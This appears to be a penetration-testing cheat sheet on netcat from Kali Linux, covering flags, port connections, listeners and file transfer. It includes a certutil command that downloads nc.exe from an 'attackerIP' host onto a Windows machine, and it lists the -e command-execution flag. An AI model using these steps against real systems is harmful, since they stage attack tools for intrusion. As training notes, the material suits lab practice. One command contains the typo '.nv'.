# Netcat

### Using Netcat on Kali Linux

* <mark style="color:yellow;">nc --help</mark>
* <mark style="color:yellow;">man nc</mark>
* <mark style="color:yellow;">-u</mark>: Connect to UDP or set up a UDP listener
* <mark style="color:yellow;">-l</mark>: Set up listener
* <mark style="color:yellow;">-n</mark>: Do not resolve hostname via DNS
* <mark style="color:yellow;">-e</mark>: Allows you to execute a specific command
* <mark style="color:yellow;">-v</mark>: verbose

#### &#x20;Connect to ports&#x20;

* <mark style="color:yellow;">nc targetIP targetPORT</mark>
  * Doesn't give any output because verbose if off
* <mark style="color:yellow;">nc -nv targetIP targetPORT</mark>

#### Connect to UDP port

* <mark style="color:yellow;">nc -nvu targetIP targetPORT</mark>

#### Open UDP listener

* <mark style="color:yellow;">nc -nvlup 1234</mark>

#### Setup a listener (Server mode)

To achieve this, since Windows doesn't come with netcat installed...we will setup a web server hosting our netcat executable that comes with Kali at:

* <mark style="color:yellow;">/usr/share/windows-binaries</mark>

#### Opening the web server on the kali

* <mark style="color:yellow;">python -m SimpleHTTPServer 80</mark>

#### Downloading on Windows through the command prompt

* <mark style="color:yellow;">certutil -urlcache -f http://attackerIP/nc.exe nc.exe</mark>

#### Setting up the listener on the Kali

* <mark style="color:yellow;">nc -nvlp 1234</mark>

#### Connecting from the Windows to the listener on the Kali

* <mark style="color:yellow;">nc.exe .nv kaliIP 1234</mark>

You can send messages from one machine to the other now.

### Transfer files with netcat

You need a listener that is going to receive the file.

We are going to transfer a file from the kali to the Windows

#### Set up the listener port on Windows

* <mark style="color:yellow;">nc.exe -nvlp 1234 >  test.txt</mark>
  * Everything that comes will be saved&#x20;
